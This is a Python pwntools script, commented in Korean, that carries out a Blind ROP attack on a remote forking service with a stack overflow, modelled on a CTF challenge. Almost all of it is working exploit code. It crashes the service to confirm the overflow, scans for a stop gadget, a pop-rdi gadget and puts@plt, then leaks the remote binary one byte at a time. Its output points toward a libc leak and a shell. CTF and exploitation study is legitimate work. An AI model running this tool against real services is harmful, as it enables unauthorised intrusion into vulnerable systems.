#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
brop_dump.py — Blind ROP(BROP)로 원격 서비스의 바이너리를 덤프하는 pwntools 샘플

전형적인 BROP 과제 환경 (HCTF 2016 'brop' 스타일):
  * 원격 서비스가 read()/gets() 계열 입력으로 스택 오버플로 발생
  * fork 서버(요청마다 자식)라 프로세스가 죽어도 서비스는 유지
  * NX 활성 / 카나리 없음 / PIE 없음 (기본 이미지 base 0x400000)
  * 바이너리 파일·libc 정보가 전혀 없는 "눈먼(blind)" 상황

동작 단계:
  Stage 1  오버플로 크래시 + 재접속 가능 여부 확인
  Stage 2  stop gadget 탐색 — payload 후에도 죽지 않고 read 루프로
           돌아가는 주소(보통 main 재진입 부근)
  Stage 3  1-pop gadget(pop rdi; ret 등) 후보 탐색
  Stage 4  PLT 탐색 — pop_rdi(probe=ELF 헤더) + PLT 후보 호출에서
           ELF 매직 응답이 오면 해당 엔트리를 puts@plt로 확정
  Stage 5  puts(addr) 1바이트 리크 반복으로 .text 덤프 → 파일 저장
  Stage 6  (자동 검증) 덤프 파일을 pwntools ELF로 열어 정상 여부 확인
           이후 수동: ROP(elf) 가젯 검색 → puts(GOT)로 libc 리크 → 셸

사용 예:
  python3 brop_dump.py 127.0.0.1 9999 --offset 72
  python3 brop_dump.py ctf.example.com 1337 --offset 72 --banner "Welcome" \
      --stop-scan-start 0x4007c0 --stop-scan-end 0x400900 \
      --plt-start 0x400540 --plt-end 0x400700 --dump-len 0x2000

구현 노트:
  * puts는 NUL에서 출력을 멈추고 마지막에 개행을 붙인다. 따라서 수신된
    "첫 1바이트"가 곧 mem[addr]이다 (첫 바이트가 개행이면 mem[addr]==0).
    연결당 1바이트라 느리지만, NUL/개행 착오가 원천적으로 없는 정확한 방식.
  * write(1, addr, len) 기반 고속 덤프는 rdx 잔존값이 0이 아닌 fork 서버에서만
    가능하다. 이 샘플은 의존성 없는 puts 방식을 택했다.
  * PLT 엔트리는 일반적으로 16바이트 간격. PLT0은 잘못 호출되면 죽거나
    무응답이라 자연히 걸러진다.
  * 입력은 sendline 기준. read() 고정 길이 과제는 io.sendline을 io.send로 교체.
  * 교육·CTF 용도 샘플. 반드시 합법적 권한이 있는 대상에만 사용할 것.
"""

import argparse
import sys
import time

from pwn import ELF, context, p64, remote

context.arch = "amd64"
context.log_level = "error"

ELF_MAGIC = b"\x7fELF"


class BROP:
    """접속 → payload → 판정 → 재접속 수명 주기를 관리하는 BROP 드라이버."""

    def __init__(self, host, port, offset, banner=b"", timeout=2.0):
        self.host = host
        self.port = port
        self.offset = offset      # 버퍼 시작 ~ saved RIP 거리
        self.banner = banner      # 재접속 배너(문자열). 있으면 생존 판정 강화
        self.timeout = timeout
        self.io = None

    # ---------------- 연결 관리 ----------------

    def _connect(self):
        try:
            if self.io is not None:
                self.io.close()
        except Exception:
            pass
        self.io = remote(self.host, self.port)
        return self.io

    def _run(self, payload, hook):
        """접속 → (배너 소비) → payload 전송 → hook(io) 결과 반환."""
        try:
            io = self._connect()
            if self.banner:
                io.recvrepeat(0.4)
            io.sendline(payload)
            return hook(io)
        except Exception:
            return None

    def try_payload(self, payload):
        """payload 전송 후 프로세스 생존 여부 (stop gadget 판정용)."""
        def hook(io):
            time.sleep(0.1)
            if not io.connected():
                return False
            if self.banner:
                return self.banner in io.recvrepeat(0.4)
            return True
        return bool(self._run(payload, hook))

    def leak(self, payload, t=1.0):
        """payload 전송 후 수신 데이터(있는 만큼) (PLT 탐색용)."""
        def hook(io):
            return io.recvrepeat(t)
        return self._run(payload, hook) or b""

    # ---------------- Stage 2: stop gadget ----------------

    def find_stop_gadget(self, start, end):
        print(f"[*] Stage 2: stop gadget 탐색 {start:#x} ~ {end:#x}")
        for addr in range(start, end):
            payload = b"A" * self.offset + p64(addr)
            if self.try_payload(payload) and self.try_payload(payload):  # 2회 확인
                print(f"[+] stop gadget: {addr:#x}")
                return addr
        return 0

    # ---------------- Stage 3+4: 1-pop gadget + puts@plt ----------------

    def find_pop_and_puts(self, stop, g_start, g_end, plt_start, plt_end,
                          probe, limit=8):
        print(f"[*] Stage 3: 1-pop gadget 후보 탐색 ({g_start:#x} ~ {g_end:#x})")
        cands = []
        for addr in range(g_start, g_end):
            payload = b"A" * self.offset + p64(addr) + p64(0x1234) + p64(stop)
            if self.try_payload(payload):
                cands.append(addr)
                print(f"[+] 1-pop 후보 #{len(cands)}: {addr:#x}")
                if len(cands) >= limit:
                    break
        if not cands:
            return 0, 0

        print(f"[*] Stage 4: PLT(puts) 탐색 ({plt_start:#x} ~ {plt_end:#x}, 16B 간격)")
        for cand in cands:
            for plt in range(plt_start, plt_end, 0x10):
                payload = (b"A" * self.offset
                           + p64(cand) + p64(probe)
                           + p64(plt) + p64(stop))
                data = self.leak(payload, t=0.8)
                if data and ELF_MAGIC in data[:128]:
                    print(f"[+] pop rdi; ret: {cand:#x} / puts@plt: {plt:#x}")
                    return cand, plt
        return 0, 0

    # ---------------- Stage 5: 덤프 ----------------

    def dump(self, pop_rdi, puts_plt, stop, start, length, out_path, retries=3):
        print(f"[*] Stage 5: 덤프 {start:#x} +{length:#x} → {out_path}")
        buf = bytearray()
        fail = 0
        for i in range(length):
            addr = start + i
            payload = (b"A" * self.offset
                       + p64(pop_rdi) + p64(addr)
                       + p64(puts_plt) + p64(stop))
            first = b""
            for _ in range(retries):
                try:
                    io = self._connect()
                    if self.banner:
                        io.recvrepeat(0.4)
                    io.sendline(payload)
                    first = io.recv(1, timeout=self.timeout)
                except Exception:
                    first = b""
                if first:
                    break
            # puts(addr): mem[addr]==0 → 개행만 수신, 그 외 → 첫 바이트 = mem[addr]
            buf.append(0 if first in (b"", b"\n") else first[0])
            if not first:
                fail += 1
                if fail >= 8:  # 연속 실패 = 미매핑 구간 추정 → 조기 종료
                    print(f"[!] {addr:#x} 연속 수신 실패 — 조기 종료")
                    break
            else:
                fail = 0
            if (i + 1) % 64 == 0:
                print(f"    ... {i + 1}/{length} bytes ({addr:#x})")
                with open(out_path, "wb") as f:
                    f.write(bytes(buf))  # 중간 저장
        with open(out_path, "wb") as f:
            f.write(bytes(buf))
        return bytes(buf)


def main():
    ap = argparse.ArgumentParser(
        description="Blind ROP(BROP) 바이너리 덤퍼 — pwntools 샘플",
        formatter_class=argparse.ArgumentDefaultsHelpFormatter)
    ap.add_argument("host", help="대상 호스트 (특정 터미널/서비스)")
    ap.add_argument("port", type=int, help="대상 포트")
    ap.add_argument("--offset", type=lambda x: int(x, 0), required=True,
                    help="버퍼 시작 ~ saved RIP 거리(바이트)")
    ap.add_argument("--base", type=lambda x: int(x, 0), default=0x400000,
                    help="이미지 base (no-PIE 가정)")
    ap.add_argument("--banner", default="",
                    help="재접속 배너 문자열(있으면 생존 판정 강화)")
    ap.add_argument("--stop-scan-start", type=lambda x: int(x, 0), default=None)
    ap.add_argument("--stop-scan-end", type=lambda x: int(x, 0), default=None)
    ap.add_argument("--plt-start", type=lambda x: int(x, 0), default=None)
    ap.add_argument("--plt-end", type=lambda x: int(x, 0), default=None)
    ap.add_argument("--dump-len", type=lambda x: int(x, 0), default=0x1000)
    ap.add_argument("--out", default=None)
    args = ap.parse_args()

    base = args.base
    banner = args.banner.encode()
    stop_s = args.stop_scan_start or base + 0x700
    stop_e = args.stop_scan_end or base + 0xB00
    plt_s = args.plt_start or base + 0x500
    plt_e = args.plt_end or base + 0x800
    out = args.out or f"dumped_{base:#x}.bin"

    b = BROP(args.host, args.port, args.offset, banner)

    print("[*] Stage 1: 크래시/재접속 확인")
    if b.try_payload(b"A" * (args.offset + 16)):
        print("[-] 오버플로 후에도 프로세스가 살아 있습니다. --offset을 확인하세요.")
        return 1
    print("[+] 크래시 감지 — 재접속 가능")

    stop = b.find_stop_gadget(stop_s, stop_e)
    if not stop:
        print("[-] stop gadget 미발견 — 범위(--stop-scan-*)를 조정하세요.")
        return 1

    pop_rdi, puts_plt = b.find_pop_and_puts(
        stop, base + 0x600, base + 0xB00, plt_s, plt_e, probe=base)
    if not puts_plt:
        print("[-] puts@plt 미발견 — PLT 범위(--plt-*)를 조정하세요.")
        return 1

    try:
        b.dump(pop_rdi, puts_plt, stop, base, args.dump_len, out)
    except KeyboardInterrupt:
        print("\n[!] 중단 — 지금까지 덤프분 저장됨")

    print("[*] Stage 6: 덤프 검증")
    try:
        e = ELF(out, checksec=False)
        print(f"[+] 정상 ELF: arch={e.arch}, entry={e.entry:#x}")
        print("[+] 다음 단보: ROP(ELF(...))로 가젯 검색 → puts(GOT) libc 리크 → 셸")
    except Exception as ex:
        print(f"[!] ELF 검증 실패(부분 덤프 가능성): {ex}")
    return 0


if __name__ == "__main__":
    sys.exit(main())
